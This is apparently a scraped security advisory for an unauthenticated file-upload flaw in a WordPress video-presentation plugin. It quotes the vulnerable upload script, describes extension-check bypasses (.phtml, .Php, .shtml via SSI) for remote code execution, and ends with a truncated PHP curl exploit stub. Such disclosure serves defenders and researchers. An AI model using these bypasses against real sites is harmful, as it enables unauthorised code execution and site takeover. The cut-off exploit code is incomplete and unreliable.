   Vulnerability:
   *Update* You can directly execute php by uploading file extension
   ending in .phtml, .rhtml, .pht as long as the extension isn't defined
   in the apache mime.types. This was a previously discovered
   vulnerability that was not properly fixed by the author. The patch was
   insufficient in blocking malicious file uploads. From
   wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php
   Allows various remote unauthenticated file uploads, among the file
   types is html where the last 4 characters are only being checked in a
   file name to match which types are allowed. Because of this .shtml can
   be passed through and remote code execution is SSI is allowed. The code
   does not do any user access validation and therefore anyone can upload
   the following files to an unsuspecting wordpress site:
   .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,
   .mp3,.flv,.avi,.mpg,.ppt,.pps The if (strstr($filename,'.php')) exit;
   can be by passed by using the extension .Php but the file extension
   check would allow files like test.Php.shtml <?php if ($_GET["room"])
   $room=$_GET["room"]; if ($_POST["room"]) $room=$_POST["room"];
   $filename=$_FILES['vw_file']['name']; include_once("incsan.php");
   sanV($room); if (!$room) exit; sanV($filename); if (!$filename) exit;
   if (strstr($filename,'.php')) exit; //do not allow uploads to other
   folders if ( strstr($room,"/") || strstr($room,"..") ) exit; if (
   strstr($filename,"/") || strstr($filename,"..") ) exit;
   $destination="uploads/".$room."/"; if ($_GET["slides"]) $destination .=
   "slides/"; $ext=strtolower(substr($filename,-4));
   $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",
   ".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt","
   .pps"); if (in_array($ext,$allowed))
   move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination .
   $filename); ?>loadstatus=1
   CVE-
   JSON: Export
   Exploit Code:

    1. <?php
    2.
    3. $uploadfile="upexp.phtml";
    4. $ch =

       ;
    9. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   10. $postResult = curl_exec($ch);
